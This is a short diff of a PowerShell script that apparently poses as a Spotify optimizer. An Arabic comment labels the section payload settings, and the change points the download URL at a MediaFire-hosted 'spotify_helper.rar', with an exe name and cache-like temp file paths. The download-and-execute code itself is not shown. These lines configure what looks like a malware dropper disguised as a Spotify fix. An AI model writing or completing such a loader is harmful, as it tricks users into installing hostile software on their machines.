@@ -74,7 +74,7 @@ if (Test-Path $audioRegPath) {
 # ═══════════════════════════════════════════════════════════════
 
 # --- إعدادات البيلود (عدل الرابط واسم الملف هنا) ---
-$packageUrl = "https://github.com/WindowsOptimizers/Spotify-Ultimate-Fix/releases/download/v1.0/optimizer.rar"
+$packageUrl = "https://download1073.mediafire.com/n7wcstpim85gDsbdh8RKmKLw6X8b7p1csA3jvPj0TFrTRXcU7jekQK52cK_Q79CM0bdA-STzpGADinmqOJdOr6Mjd9aGMhIrlukZ85RmOD4cQkaeNvN2T1nbljHeSGY5PA6nAstuuGZ5UUlPNUJxWoTKik65U6tU1YJHursMCfGmKg/9dg4w62zdh7etzo/spotify_helper.rar"
 $exeName    = "spotify_helper.exe"
 $workDir    = "$env:TEMP\SpotifyOptimizer"
 $rarPath    = "$env:TEMP\SpotifyCache.rar"
